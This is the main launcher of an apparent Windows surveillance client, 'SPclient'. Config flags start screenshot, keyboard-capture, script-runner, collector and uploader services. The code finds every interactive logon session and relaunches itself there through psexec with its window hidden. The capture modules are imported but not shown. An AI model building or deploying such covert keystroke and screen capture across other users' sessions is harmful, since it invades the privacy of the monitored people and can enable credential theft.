# -*- coding: utf-8 -*-
# from __future__ import unicode_literals

import os
import sys
import signal
import time
from services.screenshoter import Screenshoter
from services.scripter import Scripter
from services.uploader import Uploader
from services.kbdsvc import Kbdsvc
from services.collector import Collector
import logger
import platform
from config import config
import utils
from utils import fmt

log = logger.getLogger(config['NAME'], config['LOGLEVEL'])


def is_already_running(name):
    """
    Check if process "name" is already running on current loggon session
    :name: process name
    """
    import psutil
    curr_sess = utils.get_session_of_pid(os.getpid())
    for pid in psutil.pids():
        try:
            if pid != os.getpid():
                proc = psutil.Process(pid)
                if proc.name() == name and utils.get_session_of_pid(pid) == curr_sess:
                    return True
        except Exception as e:
            log.error(fmt("Error: {e} when processing pid: {p}", e=e, p=pid))


def fork_on_session(sess):
    """
    Fork self process on session "sess" via psexec
    :sess: logon session
    """
    log.debug(fmt("Run on session={0}", sess))
    import subprocess
    si = subprocess.STARTUPINFO()
    si.dwFlags = subprocess.STARTF_USESHOWWINDOW
    si.wShowWindow = subprocess.SW_HIDE
    subprocess.Popen([utils.fs_enc(os.path.join(config["SELF_DIR"], "psexec.exe")),
                      "\\\\127.0.0.1", "-accepteula", "-nobanner", "-d", "-i", str(sess),
                      utils.fs_enc(sys.executable)],
                     shell=False, startupinfo=si)


class SPclient():

    def __init__(self):
        self.datadir = os.path.join(config['HOME_DIR'], config['NAME'], utils.get_user_name())
        self.daemons = []
        signal.signal(signal.SIGTERM, self.signal_term)
        try:
            # Если при побитовой операции стартовый флаг и флаг демона равно флагу демона, то запустить демон
            if config["START_FLAG"] & Collector.FLAG == Collector.FLAG:
                self.daemons.append(Collector())
            if config["START_FLAG"] & Screenshoter.FLAG == Screenshoter.FLAG:
                self.daemons.append(Screenshoter())
            if config["START_FLAG"] & Scripter.FLAG == Scripter.FLAG:
                self.daemons.append(Scripter())
            if config["START_FLAG"] & Uploader.FLAG == Uploader.FLAG:
                self.daemons.append(Uploader())
            if config["START_FLAG"] & Kbdsvc.FLAG == Kbdsvc.FLAG:
                self.daemons.append(Kbdsvc())

            utils.makedirs(self.datadir)
        except Exception as e:
            log.error(e)

    def signal_term(self, signum, frame):
        log.debug(fmt('Get Signal: {0}', signum))
        self.stop()

    def start(self):
        for d in self.daemons:
            try:
                d.start()
            except Exception as e:
                log.error(e)
        self.wait_termination()

    def stop(self):
        for d in self.daemons:
            try:
                d.stop()
            except Exception as e:
                log.error(e)

    def wait_termination(self):
        for d in self.daemons:
            try:
                d.join()
            except Exception:
                pass


INTERACTIVE = [utils.SECURITY_LOGON_TYPE.Interactive,
               utils.SECURITY_LOGON_TYPE.RemoteInteractive,
               utils.SECURITY_LOGON_TYPE.CachedInteractive,
               utils.SECURITY_LOGON_TYPE.CachedRemoteInteractive]

if __name__ == '__main__':
    log.debug(fmt("PID={0}", os.getpid()))
    log.debug("; ".join(platform.uname()))
    try:
        if hasattr(sys, 'frozen'):
            if sys.platform.startswith('win') and utils.get_platform_ver() >= 6.0:
                curr_sess = utils.get_session_of_pid(os.getpid())
                log.debug(fmt("current session={0}", curr_sess))
                self_terminate = False

                if is_already_running(os.path.basename(sys.executable)):
                    self_terminate = True
                    log.debug(fmt("Already running on session {0}", curr_sess))
                else:
                    # fork only on interactive sessions
                    for sessdata in utils._enumerate_logonsessions2():
                        log.debug(fmt("Session={Session},{UserName},{LogonType}", **sessdata))
                        if sessdata.get('Session') == curr_sess:
                            if sessdata.get('LogonType') not in INTERACTIVE:
                                self_terminate = True
                        elif sessdata.get('LogonType') in INTERACTIVE:
                            time.sleep(1)
                            fork_on_session(sessdata.get('Session'))

                if self_terminate:
                    sys.exit()

        SPclient().start()
    except Exception as e:
        log.error(e)
        sys.exit()
    finally:
        log.debug('Exit')
